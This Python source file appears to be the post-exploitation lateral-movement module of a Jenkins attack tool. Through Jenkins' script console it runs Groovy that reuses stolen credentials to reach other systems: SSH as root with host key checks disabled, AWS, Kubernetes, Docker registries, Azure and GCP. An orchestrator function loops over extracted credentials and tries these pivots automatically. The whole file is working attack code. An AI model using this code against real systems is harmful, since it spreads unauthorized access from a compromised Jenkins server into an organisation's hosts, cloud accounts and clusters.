"""Lateral movement module for pivoting and expanding access.

Implements techniques for lateral movement using extracted credentials,
including SSH key reuse, cloud API pivoting, Kubernetes access, and
Docker registry exploitation.
"""

from dataclasses import dataclass
from typing import Any, Optional

from jenkins_breaker.postex.credentials import Credential


@dataclass
class LateralMovementResult:
    """Result of lateral movement attempt."""
    success: bool
    target: str
    method: str
    details: str
    access_type: str


class LateralMovementModule:
    """Implements lateral movement techniques."""

    def __init__(self, session: Any):
        """Initialize lateral movement module.

        Args:
            session: Authenticated Jenkins session
        """
        self.session = session

    def _execute_groovy(self, script: str) -> Optional[str]:
        """Execute Groovy script on Jenkins.

        Args:
            script: Groovy script to execute

        Returns:
            Script output or None on failure
        """
        try:
            response = self.session.post(
                f"{self.session.target}/scriptText",
                data={"script": script}
            )

            if response.status_code == 200:
                return response.text
            return None
        except Exception:
            return None

    def attempt_ssh_lateral_movement(
        self,
        ssh_key_path: str,
        target_host: str,
        username: str = "root",
        command: Optional[str] = None
    ) -> LateralMovementResult:
        """Attempt lateral movement via SSH using extracted key.

        Args:
            ssh_key_path: Path to SSH private key
            target_host: Target host to connect to
            username: SSH username
            command: Optional command to execute

        Returns:
            LateralMovementResult with attempt details
        """
        test_command = command or "hostname"

        script = f"""
try {{
    def sshCommand = ['ssh', '-i', '{ssh_key_path}', '-o', 'StrictHostKeyChecking=no',
                      '-o', 'UserKnownHostsFile=/dev/null', '{username}@{target_host}', '{test_command}']

    def proc = sshCommand.execute()
    proc.waitForOrKill(10000)

    def output = proc.in.text
    def exitCode = proc.exitValue()

    if (exitCode == 0) {{
        println "SUCCESS:" + output
    }} else {{
        println "FAILED:" + proc.err.text
    }}
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        output = self._execute_groovy(script)

        if output and "SUCCESS:" in output:
            return LateralMovementResult(
                success=True,
                target=target_host,
                method="ssh_key_reuse",
                details=f"SSH access established to {username}@{target_host}",
                access_type="ssh"
            )
        else:
            return LateralMovementResult(
                success=False,
                target=target_host,
                method="ssh_key_reuse",
                details=f"SSH access failed: {output or 'Unknown error'}",
                access_type="ssh"
            )

    def attempt_aws_lateral_movement(
        self,
        aws_access_key: str,
        aws_secret_key: str,
        region: str = "us-east-1"
    ) -> LateralMovementResult:
        """Attempt lateral movement via AWS API.

        Args:
            aws_access_key: AWS access key ID
            aws_secret_key: AWS secret access key
            region: AWS region

        Returns:
            LateralMovementResult with attempt details
        """
        script = f"""
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec
import java.security.MessageDigest

try {{
    def accessKey = '{aws_access_key}'
    def secretKey = '{aws_secret_key}'
    def region = '{region}'

    def command = ['aws', 'sts', 'get-caller-identity',
                   '--region', region]

    def env = ['AWS_ACCESS_KEY_ID=' + accessKey,
               'AWS_SECRET_ACCESS_KEY=' + secretKey]

    def proc = command.execute(env, null)
    proc.waitForOrKill(10000)

    def output = proc.in.text
    def exitCode = proc.exitValue()

    if (exitCode == 0) {{
        println "SUCCESS:" + output
    }} else {{
        println "FAILED:" + proc.err.text
    }}
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        output = self._execute_groovy(script)

        if output and "SUCCESS:" in output:
            return LateralMovementResult(
                success=True,
                target=f"AWS:{region}",
                method="aws_api",
                details=f"AWS API access validated for region {region}",
                access_type="cloud_api"
            )
        else:
            return LateralMovementResult(
                success=False,
                target=f"AWS:{region}",
                method="aws_api",
                details=f"AWS API access failed: {output or 'Unknown error'}",
                access_type="cloud_api"
            )

    def attempt_kubernetes_lateral_movement(
        self,
        kubeconfig_path: str,
        namespace: str = "default"
    ) -> LateralMovementResult:
        """Attempt lateral movement via Kubernetes API.

        Args:
            kubeconfig_path: Path to kubeconfig file
            namespace: Kubernetes namespace

        Returns:
            LateralMovementResult with attempt details
        """
        script = f"""
try {{
    def command = ['kubectl', '--kubeconfig', '{kubeconfig_path}',
                   'get', 'pods', '-n', '{namespace}']

    def proc = command.execute()
    proc.waitForOrKill(10000)

    def output = proc.in.text
    def exitCode = proc.exitValue()

    if (exitCode == 0) {{
        println "SUCCESS:" + output
    }} else {{
        println "FAILED:" + proc.err.text
    }}
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        output = self._execute_groovy(script)

        if output and "SUCCESS:" in output:
            return LateralMovementResult(
                success=True,
                target=f"k8s:{namespace}",
                method="kubernetes_api",
                details=f"Kubernetes API access validated for namespace {namespace}",
                access_type="kubernetes"
            )
        else:
            return LateralMovementResult(
                success=False,
                target=f"k8s:{namespace}",
                method="kubernetes_api",
                details=f"Kubernetes API access failed: {output or 'Unknown error'}",
                access_type="kubernetes"
            )

    def attempt_docker_registry_access(
        self,
        registry_url: str,
        username: str,
        password: str
    ) -> LateralMovementResult:
        """Attempt access to Docker registry.

        Args:
            registry_url: Docker registry URL
            username: Registry username
            password: Registry password

        Returns:
            LateralMovementResult with attempt details
        """
        script = f"""
try {{
    def command = ['docker', 'login', '{registry_url}', '-u', '{username}', '--password-stdin']

    def proc = command.execute()
    proc.out << '{password}'
    proc.out.close()
    proc.waitForOrKill(10000)

    def output = proc.in.text
    def exitCode = proc.exitValue()

    if (exitCode == 0) {{
        def listCmd = ['docker', 'search', '{registry_url}/']
        def listProc = listCmd.execute()
        listProc.waitForOrKill(10000)

        println "SUCCESS:Login successful. Images:" + listProc.in.text
    }} else {{
        println "FAILED:" + proc.err.text
    }}
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        output = self._execute_groovy(script)

        if output and "SUCCESS:" in output:
            return LateralMovementResult(
                success=True,
                target=registry_url,
                method="docker_registry",
                details=f"Docker registry access established to {registry_url}",
                access_type="container_registry"
            )
        else:
            return LateralMovementResult(
                success=False,
                target=registry_url,
                method="docker_registry",
                details=f"Docker registry access failed: {output or 'Unknown error'}",
                access_type="container_registry"
            )

    def attempt_azure_lateral_movement(
        self,
        tenant_id: str,
        client_id: str,
        client_secret: str
    ) -> LateralMovementResult:
        """Attempt lateral movement via Azure API.

        Args:
            tenant_id: Azure tenant ID
            client_id: Azure client ID
            client_secret: Azure client secret

        Returns:
            LateralMovementResult with attempt details
        """
        script = f"""
try {{
    def command = ['az', 'login', '--service-principal',
                   '-u', '{client_id}',
                   '-p', '{client_secret}',
                   '--tenant', '{tenant_id}']

    def proc = command.execute()
    proc.waitForOrKill(15000)

    def output = proc.in.text
    def exitCode = proc.exitValue()

    if (exitCode == 0) {{
        def accountCmd = ['az', 'account', 'show']
        def accountProc = accountCmd.execute()
        accountProc.waitForOrKill(10000)

        println "SUCCESS:" + accountProc.in.text
    }} else {{
        println "FAILED:" + proc.err.text
    }}
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        output = self._execute_groovy(script)

        if output and "SUCCESS:" in output:
            return LateralMovementResult(
                success=True,
                target=f"Azure:{tenant_id}",
                method="azure_api",
                details=f"Azure API access validated for tenant {tenant_id}",
                access_type="cloud_api"
            )
        else:
            return LateralMovementResult(
                success=False,
                target=f"Azure:{tenant_id}",
                method="azure_api",
                details=f"Azure API access failed: {output or 'Unknown error'}",
                access_type="cloud_api"
            )

    def attempt_gcp_lateral_movement(
        self,
        service_account_key_path: str,
        project_id: str
    ) -> LateralMovementResult:
        """Attempt lateral movement via GCP API.

        Args:
            service_account_key_path: Path to GCP service account key JSON
            project_id: GCP project ID

        Returns:
            LateralMovementResult with attempt details
        """
        script = f"""
try {{
    def command = ['gcloud', 'auth', 'activate-service-account',
                   '--key-file', '{service_account_key_path}']

    def proc = command.execute()
    proc.waitForOrKill(10000)

    def exitCode = proc.exitValue()

    if (exitCode == 0) {{
        def projectCmd = ['gcloud', 'projects', 'describe', '{project_id}']
        def projectProc = projectCmd.execute()
        projectProc.waitForOrKill(10000)

        println "SUCCESS:" + projectProc.in.text
    }} else {{
        println "FAILED:" + proc.err.text
    }}
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        output = self._execute_groovy(script)

        if output and "SUCCESS:" in output:
            return LateralMovementResult(
                success=True,
                target=f"GCP:{project_id}",
                method="gcp_api",
                details=f"GCP API access validated for project {project_id}",
                access_type="cloud_api"
            )
        else:
            return LateralMovementResult(
                success=False,
                target=f"GCP:{project_id}",
                method="gcp_api",
                details=f"GCP API access failed: {output or 'Unknown error'}",
                access_type="cloud_api"
            )

    def attempt_lateral_movement_with_credentials(
        self,
        credentials: list[Credential],
        targets: Optional[list[str]] = None
    ) -> list[LateralMovementResult]:
        """Attempt lateral movement using extracted credentials.

        Args:
            credentials: List of Credential objects
            targets: Optional list of target hosts

        Returns:
            List of LateralMovementResult objects
        """
        results = []

        for cred in credentials:
            if cred.type == "ssh_private_key" and targets:
                for target in targets:
                    result = self.attempt_ssh_lateral_movement(
                        cred.source or "/tmp/key",
                        target,
                        "root"
                    )
                    results.append(result)

            elif cred.type == "aws_access_key" and cred.key:
                for other_cred in credentials:
                    if other_cred.type == "aws_secret_key":
                        result = self.attempt_aws_lateral_movement(
                            cred.key,
                            other_cred.key or ""
                        )
                        results.append(result)
                        break

            elif cred.type == "azure_service_principal":
                metadata = cred.metadata
                if all(k in metadata for k in ["tenant_id", "client_id", "client_secret"]):
                    result = self.attempt_azure_lateral_movement(
                        metadata["tenant_id"],
                        metadata["client_id"],
                        metadata["client_secret"]
                    )
                    results.append(result)

        return results


def perform_lateral_movement(
    session: Any,
    credentials: list[Credential],
    targets: Optional[list[str]] = None
) -> list[LateralMovementResult]:
    """Factory function to perform lateral movement.

    Args:
        session: Authenticated Jenkins session
        credentials: List of extracted credentials
        targets: Optional list of target hosts

    Returns:
        List of lateral movement results
    """
    module = LateralMovementModule(session)
    return module.attempt_lateral_movement_with_credentials(credentials, targets)
